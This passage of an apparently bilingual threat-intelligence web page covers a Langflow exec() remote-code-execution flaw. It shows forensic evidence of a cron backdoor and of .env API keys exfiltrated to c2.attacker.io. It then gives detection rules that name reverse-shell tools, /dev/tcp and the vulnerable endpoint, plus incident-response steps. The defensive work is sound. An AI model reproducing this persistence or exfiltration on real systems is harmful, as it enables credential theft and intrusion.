+            <span class="mtt-evidence-src">crontab / filesystem audit</span>
+          </div>
+          <div class="mtt-evidence-body">$ crontab -l
+*/5 * * * * python3 /tmp/.lf/backdoor.py 2>/dev/null
+
+$ ls -la /tmp/.lf/
+total 12
+drwx------ 2 root root  60 Mar 17 14:33 .
+drwxrwxrwt 8 root root 180 Mar 17 14:33 ..
+-rwxr-xr-x 1 root root 412 Mar 17 14:33 backdoor.py</div>
+        </div>
+        <div class="mtt-annotation" data-en="&lt;strong&gt;Detection signal:&lt;/strong&gt; Crontab modification by web application process is anomalous in all contexts. /tmp/ hidden directory creation from web service process is high-confidence indicator." data-tr="&lt;strong&gt;Tespit sinyali:&lt;/strong&gt; Web uygulama süreci tarafından crontab değişikliği her bağlamda anormaldir. Web hizmet sürecinden /tmp/ gizli dizin oluşturması yüksek güvenilirlikte bir göstergedir."><strong>Detection signal:</strong> Crontab modification by web application process is anomalous in all contexts. /tmp/ hidden directory creation from web service process is high-confidence indicator.</div>
+      </div>
+
+      <div class="mtt-item">
+        <div class="mtt-tactic" data-en="Exfiltration" data-tr="Dışarıya Sızdırma">Exfiltration</div>
+        <div class="mtt-technique-title" data-en="T1041 — Exfiltration Over C2 Channel" data-tr="T1041 — C2 Kanalı Üzerinden Dışarıya Sızdırma">T1041 — Exfiltration Over C2 Channel</div>
+        <div class="mtt-tids"><span class="mtt-tid">T1041</span></div>
+        <div class="mtt-desc" data-en="curl POST to external domain with base64-encoded .env content; DNS queries to attacker-controlled domain from Langflow host. The exfil uses HTTPS to blend with legitimate AI service outbound traffic — Langflow hosts routinely make HTTPS calls to OpenAI, Anthropic, and HuggingFace." data-tr="Base64 kodlu .env içeriğiyle harici domain'e curl POST; Langflow host'undan saldırgan kontrollü domain'e DNS sorguları. Sızdırma işlemi, meşru AI servis giden trafiğiyle karışmak için HTTPS kullanır — Langflow host'ları rutin olarak OpenAI, Anthropic ve HuggingFace'e HTTPS çağrıları yapar.">curl POST to external domain with base64-encoded .env content; DNS queries to attacker-controlled domain from Langflow host. The exfil uses HTTPS to blend with legitimate AI service outbound traffic — Langflow hosts routinely make HTTPS calls to OpenAI, Anthropic, and HuggingFace.</div>
+        <div class="mtt-evidence">
+          <div class="mtt-evidence-hd">
+            <span class="mtt-evidence-title" data-en="Forensic Evidence" data-tr="Adli Kanıt">Forensic Evidence</span>
+            <span class="mtt-evidence-src">network capture / proxy log</span>
+          </div>
+          <div class="mtt-evidence-body">PROXY LOG:
+2026-03-17T14:34:02Z POST https://c2.attacker.io/collect
+  Content-Length: 4892
+  X-Forwarded-For: 10.0.1.5 (langflow-prod)
+  Body (base64-decoded): host=langflow-prod&env=OPENAI_API_KEY=sk-proj-...
+
+DNS QUERIES from langflow-prod:
+14:33:58 c2.attacker.io      → 185.220.x.x
+14:34:01 c2.attacker.io      → 185.220.x.x  [exfil POST]
+14:39:03 c2.attacker.io      → 185.220.x.x  [cron beacon]</div>
+        </div>
+        <div class="mtt-annotation" data-en="&lt;strong&gt;Detection signal:&lt;/strong&gt; Large base64-encoded POST body to non-AI-service domain from AI host is high-confidence exfil signal. Baseline expected destinations: openai.com, anthropic.com, api.huggingface.co." data-tr="&lt;strong&gt;Tespit sinyali:&lt;/strong&gt; AI host'tan AI servis dışı domain'e gönderilen büyük base64 kodlu POST body, yüksek güvenilirlikte bir sızdırma sinyalidir. Temel beklenen hedefler: openai.com, anthropic.com, api.huggingface.co."><strong>Detection signal:</strong> Large base64-encoded POST body to non-AI-service domain from AI host is high-confidence exfil signal. Baseline expected destinations: openai.com, anthropic.com, api.huggingface.co.</div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ── DETECTION RULES — BLUE TEAM ── -->
+  <div class="reveal" id="detection">
+    <div class="team-label team-blue">🔵 <span data-en="BLUE TEAM" data-tr="MAVİ TAKIM">BLUE TEAM</span></div>
+    <div class="section-label" data-en="Detection Engineering" data-tr="Tespit Mühendisliği">Detection Engineering</div>
+    <h2 data-en="Detection Rules — 11 Platforms" data-tr="Tespit Kuralları — 11 Platform">Detection Rules — 11 Platforms</h2>
+    <p data-en="All rules are TTP-based (behavioral), require minimum 2 AND-conditions, and contain no hardcoded IOCs. Rules detect the behavioral pattern — not specific infrastructure — ensuring durable detection across attacker infrastructure rotation." data-tr="Tüm kurallar TTP tabanlıdır (davranışsal), minimum 2 AND koşulu gerektirir ve sabit kodlanmış IOC içermez. Kurallar davranış kalıbını tespit eder — belirli altyapıyı değil — bu sayede saldırgan altyapı rotasyonlarında dayanıklı tespit sağlar.">All rules are TTP-based (behavioral), require minimum 2 AND-conditions, and contain no hardcoded IOCs. Rules detect the behavioral pattern — not specific infrastructure — ensuring durable detection across attacker infrastructure rotation.</p>
+
+    <!-- SIEM Group -->
+    <div class="rule-group">
+      <div class="rule-group-hd">
+        <span class="rgb-siem" data-en="SIEM" data-tr="SIEM">SIEM</span>
+        <span class="rule-group-label" data-en="Log-based Detection Rules" data-tr="Log Tabanlı Tespit Kuralları">Log-based Detection Rules</span>
+      </div>
+
+      <!-- Sigma -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title"><span class="platform-badge">Sigma</span><span data-en="Langflow Python exec() Exploitation — Shell Spawn" data-tr="Langflow Python exec() İstismarı — Shell Başlatma">Langflow Python exec() Exploitation — Shell Spawn</span></div>
+          <div class="rule-toggle">▼</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              <span data-en="sigma-langflow-shell-spawn.yml" data-tr="sigma-langflow-shell-spawn.yml">sigma-langflow-shell-spawn.yml</span>
+            </div>
+            <div class="code-body"><span class="kw">title</span>: <span class="str">Langflow AI Pipeline — Unexpected Shell from Web Process</span>
+<span class="kw">id</span>: <span class="str">2a4b6c8d-1e3f-5a7b-9c0d-2e4f6a8b0c1d</span>
+<span class="kw">status</span>: experimental
+<span class="kw">description</span>: <span class="str">Detects bash/sh spawned by Langflow/uvicorn processes — indicator of Python exec() RCE (CVE-2026-33017)</span>
+<span class="kw">author</span>: TI-DE
+<span class="kw">date</span>: <span class="num">2026/03/27</span>
+<span class="kw">tags</span>:
+  - attack.initial_access
+  - attack.t1190
+  - attack.execution
+  - attack.t1059.006
+<span class="kw">logsource</span>:
+  category: process_creation
+  product: linux
+<span class="kw">detection</span>:
+  selection:
+    ParentImage|contains:
+      - <span class="str">'langflow'</span>
+      - <span class="str">'uvicorn'</span>
+      - <span class="str">'python'</span>
+    Image|endswith:
+      - <span class="str">'/bash'</span>
+      - <span class="str">'/sh'</span>
+    CommandLine|contains:
+      - <span class="str">'socket'</span>
+      - <span class="str">'subprocess'</span>
+      - <span class="str">'import os'</span>
+  condition: selection
+<span class="kw">falsepositives</span>:
+  - <span class="str">Legitimate Python scripts calling bash — reduce by ParentImage specificity</span>
+<span class="kw">level</span>: high</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Sentinel KQL -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title"><span class="platform-badge">Microsoft Sentinel</span><span data-en="Langflow API Key Exfiltration Pattern" data-tr="Langflow API Key Dışarıya Sızdırma Kalıbı">Langflow API Key Exfiltration Pattern</span></div>
+          <div class="rule-toggle">▼</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              <span data-en="sentinel-langflow-exfil.kql" data-tr="sentinel-langflow-exfil.kql">sentinel-langflow-exfil.kql</span>
+            </div>
+            <div class="code-body"><span class="cmt">// Detects large base64-encoded POST to external domains from AI service hosts</span>
+<span class="fn">CommonSecurityLog</span>
+| <span class="kw">where</span> DeviceProduct == <span class="str">"Nginx"</span> <span class="kw">or</span> DeviceProduct == <span class="str">"Application Gateway"</span>
+| <span class="kw">where</span> RequestMethod == <span class="str">"POST"</span>
+| <span class="kw">where</span> RequestURL !contains <span class="str">"openai.com"</span> <span class="kw">and</span> RequestURL !contains <span class="str">"anthropic.com"</span>
+| <span class="kw">where</span> RequestBodyBytes > <span class="num">5000</span>
+| <span class="kw">where</span> SourceHostName contains <span class="str">"langflow"</span> <span class="kw">or</span> SourceHostName contains <span class="str">"ai"</span>
+| <span class="kw">where</span> RequestBody contains <span class="str">"base64"</span> <span class="kw">or</span> RequestBody matches regex <span class="str">@"[A-Za-z0-9+/]{100,}={0,2}"</span>
+| <span class="kw">project</span> TimeGenerated, SourceHostName, DestinationHostName, RequestURL, RequestBodyBytes
+| <span class="kw">extend</span> TTP = <span class="str">"T1041 - Exfiltration Over C2"</span></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Splunk SPL -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title"><span class="platform-badge">Splunk</span><span data-en="Langflow Process — Outbound Socket Connection" data-tr="Langflow Süreci — Giden Soket Bağlantısı">Langflow Process — Outbound Socket Connection</span></div>
+          <div class="rule-toggle">▼</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              <span data-en="splunk-langflow-socket.spl" data-tr="splunk-langflow-socket.spl">splunk-langflow-socket.spl</span>
+            </div>
+            <div class="code-body">index=endpoint sourcetype=linux_audit
+| <span class="kw">where</span> process_name IN (<span class="str">"langflow"</span>, <span class="str">"uvicorn"</span>, <span class="str">"python3"</span>, <span class="str">"python"</span>)
+| <span class="kw">where</span> action=<span class="str">"connect"</span> AND dest_port NOT IN (<span class="num">443</span>, <span class="num">80</span>)
+| <span class="kw">eval</span> dest_is_external=<span class="fn">if</span>(
+    NOT <span class="fn">cidrmatch</span>(<span class="str">"10.0.0.0/8"</span>, dest_ip) AND
+    NOT <span class="fn">cidrmatch</span>(<span class="str">"172.16.0.0/12"</span>, dest_ip) AND
+    NOT <span class="fn">cidrmatch</span>(<span class="str">"192.168.0.0/16"</span>, dest_ip),
+    <span class="str">"true"</span>, <span class="str">"false"</span>)
+| <span class="kw">where</span> dest_is_external=<span class="str">"true"</span>
+| <span class="fn">stats</span> count <span class="kw">by</span> host, process_name, dest_ip, dest_port, _time
+| <span class="kw">where</span> count >= <span class="num">1</span></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- QRadar AQL -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title"><span class="platform-badge">IBM QRadar</span><span data-en="Langflow Unauthorized Code Execution" data-tr="Langflow Yetkisiz Kod Yürütme">Langflow Unauthorized Code Execution</span></div>
+          <div class="rule-toggle">▼</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              <span data-en="qradar-langflow-rce.aql" data-tr="qradar-langflow-rce.aql">qradar-langflow-rce.aql</span>
+            </div>
+            <div class="code-body"><span class="kw">SELECT</span> sourceip, username, <span class="str">"Process Name"</span>, <span class="str">"Command"</span>,
+       <span class="str">"Parent Process Name"</span>, <span class="str">"Destination IP"</span>, starttime
+<span class="kw">FROM</span> events
+<span class="kw">WHERE</span> <span class="str">"Parent Process Name"</span> <span class="kw">ILIKE</span> <span class="str">'%uvicorn%'</span>
+   <span class="kw">OR</span> <span class="str">"Parent Process Name"</span> <span class="kw">ILIKE</span> <span class="str">'%langflow%'</span>
+<span class="kw">AND</span> (<span class="str">"Process Name"</span> <span class="kw">ILIKE</span> <span class="str">'%bash%'</span> <span class="kw">OR</span> <span class="str">"Process Name"</span> <span class="kw">ILIKE</span> <span class="str">'%sh%'</span>
+     <span class="kw">OR</span> <span class="str">"Command"</span> <span class="kw">ILIKE</span> <span class="str">'%socket%'</span>)
+<span class="kw">AND</span> starttime > NOW() - <span class="num">4</span> HOURS
+<span class="kw">ORDER BY</span> starttime <span class="kw">DESC</span></div>
+          </div>
+        </div>
+      </div>
+    </div><!-- /SIEM group -->
+
+    <!-- EDR/XDR Group -->
+    <div class="rule-group">
+      <div class="rule-group-hd">
+        <span class="rgb-edr" data-en="EDR / XDR" data-tr="EDR / XDR">EDR / XDR</span>
+        <span class="rule-group-label" data-en="Endpoint Detection &amp; Response Rules" data-tr="Uç Nokta Tespit ve Yanıt Kuralları">Endpoint Detection &amp; Response Rules</span>
+      </div>
+
+      <!-- MDE KQL -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title"><span class="platform-badge">MDE</span><span data-en="Langflow — Python Child Reverse Shell" data-tr="Langflow — Python Alt Reverse Shell">Langflow — Python Child Reverse Shell</span></div>
+          <div class="rule-toggle">▼</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              <span data-en="mde-langflow-child-shell.kql" data-tr="mde-langflow-child-shell.kql">mde-langflow-child-shell.kql</span>
+            </div>
+            <div class="code-body"><span class="fn">DeviceProcessEvents</span>
+| <span class="kw">where</span> InitiatingProcessFileName in~ (<span class="str">"langflow"</span>, <span class="str">"uvicorn"</span>, <span class="str">"python3"</span>, <span class="str">"python"</span>)
+| <span class="kw">where</span> FileName in~ (<span class="str">"bash"</span>, <span class="str">"sh"</span>, <span class="str">"nc"</span>, <span class="str">"ncat"</span>, <span class="str">"curl"</span>, <span class="str">"wget"</span>)
+| <span class="kw">where</span> ProcessCommandLine has_any (<span class="str">"socket"</span>, <span class="str">"connect"</span>, <span class="str">"/dev/tcp"</span>, <span class="str">"reverse"</span>)
+| <span class="kw">project</span> Timestamp, DeviceName, InitiatingProcessFileName,
+          InitiatingProcessCommandLine, FileName, ProcessCommandLine
+| <span class="kw">extend</span> TTP = <span class="str">"T1059.006 / T1190"</span></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Cortex XDR XQL -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title"><span class="platform-badge">Cortex XDR</span><span data-en="Langflow Web Process Shell Spawn (BIOC)" data-tr="Langflow Web Süreci Shell Başlatma (BIOC)">Langflow Web Process Shell Spawn (BIOC)</span></div>
+          <div class="rule-toggle">▼</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              <span data-en="cortex-xdr-langflow-shell.xql" data-tr="cortex-xdr-langflow-shell.xql">cortex-xdr-langflow-shell.xql</span>
+            </div>
+            <div class="code-body">dataset = xdr_data
+| <span class="kw">filter</span> event_type = ENUM.EVENT_TYPE_PROCESS
+| <span class="kw">filter</span> actor_process_image_name in (<span class="str">"langflow"</span>, <span class="str">"uvicorn"</span>, <span class="str">"python3"</span>, <span class="str">"python"</span>)
+| <span class="kw">filter</span> action_process_image_name in (<span class="str">"bash"</span>, <span class="str">"sh"</span>, <span class="str">"dash"</span>)
+| <span class="kw">filter</span> action_process_causality_id != actor_process_causality_id
+| <span class="kw">fields</span> _time, agent_hostname, actor_process_image_name,
+         action_process_image_name, action_process_image_path,
+         action_process_os_pid</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- CrowdStrike Hunting -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title"><span class="platform-badge">CrowdStrike</span><span data-en="Python Web Server Anomalous Child Process — Hunting" data-tr="Python Web Sunucusu Anormal Alt Süreci — Tehdit Avcılığı">Python Web Server Anomalous Child Process — Hunting</span></div>
+          <div class="rule-toggle">▼</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              <span data-en="crowdstrike-hunting-langflow.spl" data-tr="crowdstrike-hunting-langflow.spl">crowdstrike-hunting-langflow.spl</span>
+            </div>
+            <div class="code-body">index=crowdstrike event_simpleName=ProcessRollup2
+| <span class="kw">where</span> ParentBaseFileName IN (<span class="str">"python3"</span>, <span class="str">"python"</span>, <span class="str">"uvicorn"</span>, <span class="str">"langflow"</span>)
+| <span class="kw">where</span> FileName IN (<span class="str">"bash"</span>,<span class="str">"sh"</span>,<span class="str">"curl"</span>,<span class="str">"wget"</span>,<span class="str">"nc"</span>,<span class="str">"ncat"</span>)
+| <span class="kw">where</span> NOT CommandLine MATCHES <span class="str">".*pip install.*"</span>
+| <span class="fn">table</span> _time, ComputerName, ParentBaseFileName, ParentCommandLine, FileName, CommandLine</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- CrowdStrike IOA -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title"><span class="platform-badge">CrowdStrike IOA</span><span data-en="Langflow exec() Exploitation — Custom IOA" data-tr="Langflow exec() İstismarı — Özel IOA">Langflow exec() Exploitation — Custom IOA</span></div>
+          <div class="rule-toggle">▼</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              <span data-en="crowdstrike-ioa-langflow-rce.json" data-tr="crowdstrike-ioa-langflow-rce.json">crowdstrike-ioa-langflow-rce.json</span>
+            </div>
+            <div class="code-body">{
+  <span class="kw">"name"</span>: <span class="str">"CVE-2026-33017 - Langflow Python RCE Shell Spawn"</span>,
+  <span class="kw">"description"</span>: <span class="str">"Python web process (uvicorn/langflow) spawning interactive shell"</span>,
+  <span class="kw">"platform"</span>: <span class="str">"Linux"</span>,
+  <span class="kw">"severity"</span>: <span class="str">"High"</span>,
+  <span class="kw">"rule_type"</span>: <span class="str">"process"</span>,
+  <span class="kw">"disposition"</span>: <span class="str">"Detect + Alert"</span>,
+  <span class="kw">"conditions"</span>: [
+    {
+      <span class="kw">"field"</span>: <span class="str">"ParentImageFileName"</span>,
+      <span class="kw">"operator"</span>: <span class="str">"IN"</span>,
+      <span class="kw">"value"</span>: [<span class="str">"uvicorn"</span>, <span class="str">"langflow"</span>, <span class="str">"python3"</span>]
+    },
+    {
+      <span class="kw">"field"</span>: <span class="str">"ImageFileName"</span>,
+      <span class="kw">"operator"</span>: <span class="str">"IN"</span>,
+      <span class="kw">"value"</span>: [<span class="str">"bash"</span>, <span class="str">"sh"</span>, <span class="str">"dash"</span>]
+    },
+    {
+      <span class="kw">"field"</span>: <span class="str">"CommandLine"</span>,
+      <span class="kw">"operator"</span>: <span class="str">"MATCH"</span>,
+      <span class="kw">"value"</span>: <span class="str">".*(-i|socket|connect|/dev/tcp).*"</span>
+    }
+  ]
+}</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- SentinelOne -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title"><span class="platform-badge">SentinelOne</span><span data-en="AI Service Process Spawning Shell (PowerQuery)" data-tr="AI Servis Süreci Shell Başlatma (PowerQuery)">AI Service Process Spawning Shell (PowerQuery)</span></div>
+          <div class="rule-toggle">▼</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              <span data-en="sentinelone-langflow-shell.pq" data-tr="sentinelone-langflow-shell.pq">sentinelone-langflow-shell.pq</span>
+            </div>
+            <div class="code-body">src.process.name in (<span class="str">"langflow"</span>, <span class="str">"uvicorn"</span>, <span class="str">"python3"</span>) AND
+tgt.process.name in (<span class="str">"bash"</span>, <span class="str">"sh"</span>) AND
+(tgt.process.cmdLine contains <span class="str">"socket"</span> OR
+ tgt.process.cmdLine contains <span class="str">"-i"</span> OR
+ network.direction = <span class="str">"OUTBOUND"</span>)</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Carbon Black -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title"><span class="platform-badge">Carbon Black</span><span data-en="Langflow Shell Spawn Detection (CBQL)" data-tr="Langflow Shell Başlatma Tespiti (CBQL)">Langflow Shell Spawn Detection (CBQL)</span></div>
+          <div class="rule-toggle">▼</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              <span data-en="carbonblack-langflow-shell.cbql" data-tr="carbonblack-langflow-shell.cbql">carbonblack-langflow-shell.cbql</span>
+            </div>
+            <div class="code-body">parent_name:uvicorn process_name:bash <span class="kw">OR</span>
+parent_name:langflow process_name:bash <span class="kw">OR</span>
+(parent_name:python3 process_name:bash cmdline:<span class="str">"socket"</span>)</div>
+          </div>
+        </div>
+      </div>
+    </div><!-- /EDR group -->
+
+    <!-- Pattern Group -->
+    <div class="rule-group">
+      <div class="rule-group-hd">
+        <span class="rgb-pattern" data-en="Pattern" data-tr="Kalıp">Pattern</span>
+        <span class="rule-group-label" data-en="Signature &amp; Pattern Matching" data-tr="İmza ve Kalıp Eşleştirme">Signature &amp; Pattern Matching</span>
+      </div>
+
+      <!-- YARA -->
+      <div class="rule-card" onclick="toggleRule(this)">
+        <div class="rule-header">
+          <div class="rule-title"><span class="platform-badge">YARA</span><span data-en="Langflow exec() Exploitation Payload" data-tr="Langflow exec() İstismar Yükü">Langflow exec() Exploitation Payload</span></div>
+          <div class="rule-toggle">▼</div>
+        </div>
+        <div class="rule-body">
+          <div class="code-block">
+            <div class="code-header">
+              <div class="code-dots"><span class="code-dot" style="background:#ff5f57"></span><span class="code-dot" style="background:#febc2e"></span><span class="code-dot" style="background:#28c840"></span></div>
+              <span data-en="langflow-exec-injection.yar" data-tr="langflow-exec-injection.yar">langflow-exec-injection.yar</span>
+            </div>
+            <div class="code-body"><span class="kw">rule</span> <span class="fn">Langflow_exec_Injection_CVE_2026_33017</span> {
+    <span class="kw">meta</span>:
+        description = <span class="str">"Detects HTTP requests exploiting Langflow Python exec() injection"</span>
+        author      = <span class="str">"TI-DE"</span>
+        date        = <span class="str">"2026-03-27"</span>
+        reference   = <span class="str">"CVE-2026-33017"</span>
+        severity    = <span class="str">"high"</span>
+    <span class="kw">strings</span>:
+        $api_path    = <span class="str">"/api/v1/build_public_tmp/"</span> ascii
+        $code_key    = <span class="str">"\"code\":{\"value\":"</span> ascii
+        $import_os   = <span class="str">"import os"</span> ascii
+        $import_sock = <span class="str">"import socket"</span> ascii
+        $subprocess  = <span class="str">"subprocess"</span> ascii
+    <span class="kw">condition</span>:
+        $api_path <span class="kw">and</span> $code_key <span class="kw">and</span>
+        ($import_os <span class="kw">or</span> $import_sock <span class="kw">or</span> $subprocess)
+}</div>
+          </div>
+        </div>
+      </div>
+    </div><!-- /Pattern group -->
+  </div>
+
+  <!-- ── RECOMMENDATIONS — BLUE TEAM ── -->
+  <div class="reveal" id="recommendations">
+    <div class="team-label team-blue">🔵 <span data-en="BLUE TEAM" data-tr="MAVİ TAKIM">BLUE TEAM</span></div>
+    <div class="section-label" data-en="Incident Response" data-tr="Olay Müdahalesi">Incident Response</div>
+    <h2 data-en="Response Actions" data-tr="Yanıt Eylemleri">Response Actions</h2>
+    <div class="rec-grid">
+      <div class="rec-card">
+        <div class="rec-icon">🔄</div>
+        <div class="rec-title" data-en="Upgrade to 1.9.0+" data-tr="1.9.0+ Sürümüne Yükseltin">Upgrade to 1.9.0+</div>
+        <div class="rec-desc" data-en="Version 1.8.2 is NOT a complete fix — JFrog confirmed it remains vulnerable. Only 1.9.0+ fully removes the exec() call from the unauthenticated endpoint. Verify with: pip show langflow | grep Version" data-tr="1.8.2 sürümü TAM bir düzeltme DEĞİLDİR — JFrog hâlâ savunmasız olduğunu doğruladı. Yalnızca 1.9.0+, kimlik doğrulamasız endpoint'ten exec() çağrısını tamamen kaldırır. Doğrulama: pip show langflow | grep Version">Version 1.8.2 is NOT a complete fix — JFrog confirmed it remains vulnerable. Only 1.9.0+ fully removes the exec() call from the unauthenticated endpoint. Verify with: <code>pip show langflow | grep Version</code></div>
+      </div>
+      <div class="rec-card">
+        <div class="rec-icon">🔒</div>
+        <div class="rec-title" data-en="Block Port 7860" data-tr="7860 Portunu Engelleyin">Block Port 7860</div>
+        <div class="rec-desc" data-en="Remove Langflow from internet exposure immediately. Default port 7860 should be firewalled or bound to localhost only. Use a reverse proxy with authentication in front of any Langflow instance that must be network-accessible." data-tr="Langflow'u internet erişiminden hemen kaldırın. Varsayılan 7860 portu güvenlik duvarıyla korunmalı veya yalnızca localhost'a bağlanmalıdır. Ağdan erişilmesi gereken Langflow instance'larının önüne kimlik doğrulamalı bir reverse proxy koyun.">Remove Langflow from internet exposure immediately. Default port 7860 should be firewalled or bound to localhost only. Use a reverse proxy with authentication in front of any Langflow instance that must be network-accessible.</div>
+      </div>
+      <div class="rec-card">
+        <div class="rec-icon">🔍</div>
+        <div class="rec-title" data-en="Hunt Process Ancestry" data-tr="Süreç Soyağacını Araştırın">Hunt Process Ancestry</div>
+        <div class="rec-desc" data-en="Search EDR for uvicorn or langflow processes spawning bash, sh, curl, or wget. Any such process tree is anomalous. Look back 30+ days if your Langflow version was ≤ 1.8.x." data-tr="EDR'de bash, sh, curl veya wget başlatan uvicorn veya langflow süreçlerini arayın. Böyle bir süreç ağacı anormaldir. Langflow sürümünüz ≤ 1.8.x ise 30+ gün geriye bakın.">Search EDR for uvicorn or langflow processes spawning bash, sh, curl, or wget. Any such process tree is anomalous. Look back 30+ days if your Langflow version was ≤ 1.8.x.</div>
+      </div>
+      <div class="rec-card">
+        <div class="rec-icon">🔑</div>
+        <div class="rec-title" data-en="Rotate API Keys" data-tr="API Anahtarlarını Rotasyon Yapın">Rotate API Keys</div>
+        <div class="rec-desc" data-en="Any Langflow instance running a vulnerable version should be treated as having exfiltrated its .env contents. Immediately rotate: OpenAI, Anthropic, AWS, HuggingFace, and any other credentials present in the environment." data-tr="Savunmasız sürüm çalıştıran herhangi bir Langflow instance'ı .env içeriğini sızdırmış gibi değerlendirilmelidir. Hemen değiştirin: OpenAI, Anthropic, AWS, HuggingFace ve ortamdaki diğer tüm kimlik bilgileri.">Any Langflow instance running a vulnerable version should be treated as having exfiltrated its .env contents. Immediately rotate: OpenAI, Anthropic, AWS, HuggingFace, and any other credentials present in the environment.</div>
+      </div>
+      <div class="rec-card">
+        <div class="rec-icon">📁</div>
+        <div class="rec-title" data-en="Inspect .env Files" data-tr=".env Dosyalarını İnceleyin">Inspect .env Files</div>
+        <div class="rec-desc" data-en="Audit what credentials were stored in .env, ~/.langflow/config, and process environment variables. Assume all of these were read and exfiltrated if your instance was internet-exposed and running a vulnerable version." data-tr=".env, ~/.langflow/config ve süreç ortam değişkenlerinde hangi kimlik bilgilerinin saklandığını denetleyin. Instance'ınız internete açıksa ve savunmasız sürüm çalıştırıyorsa tüm bu bilgilerin okunup sızdırıldığını varsayın.">Audit what credentials were stored in .env, ~/.langflow/config, and process environment variables. Assume all of these were read and exfiltrated if your instance was internet-exposed and running a vulnerable version.</div>
+      </div>
+      <div class="rec-card">
+        <div class="rec-icon">🗓</div>
+        <div class="rec-title" data-en="Review Crontabs" data-tr="Crontab'ları İnceleyin">Review Crontabs</div>
+        <div class="rec-desc" data-en="Check all crontabs (root and service user) for unauthorized entries. Inspect /tmp/ for hidden directories. Check for new files in ~/.config/ that may be backdoor scripts or persistence mechanisms." data-tr="Tüm crontab'ları (root ve servis kullanıcısı) yetkisiz girişler için kontrol edin. /tmp/ içindeki gizli dizinleri inceleyin. ~/.config/ içinde backdoor betikleri veya kalıcılık mekanizmaları olabilecek yeni dosyaları kontrol edin.">Check all crontabs (root and service user) for unauthorized entries. Inspect /tmp/ for hidden directories. Check for new files in ~/.config/ that may be backdoor scripts or persistence mechanisms.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── WRITE-UPS ── -->
+  <div class="reveal" id="writeups">
+    <div class="section-label" data-en="References" data-tr="Referanslar">References</div>
+    <h2 data-en="PoC &amp; Write-ups" data-tr="PoC ve Analizler">PoC &amp; Write-ups</h2>
+    <div class="poc-grid">
+
+      <div class="poc-card">
+        <span class="poc-tag analysis">analysis</span>
+        <div class="poc-card-title" data-en="CVE-2025-3248: Langflow RCE Exploited in the Wild" data-tr="CVE-2025-3248: Langflow RCE Vahşi Ortamda İstismar Edildi">CVE-2025-3248: Langflow RCE Exploited in the Wild</div>
+        <div class="poc-card-src">Sysdig Threat Research</div>
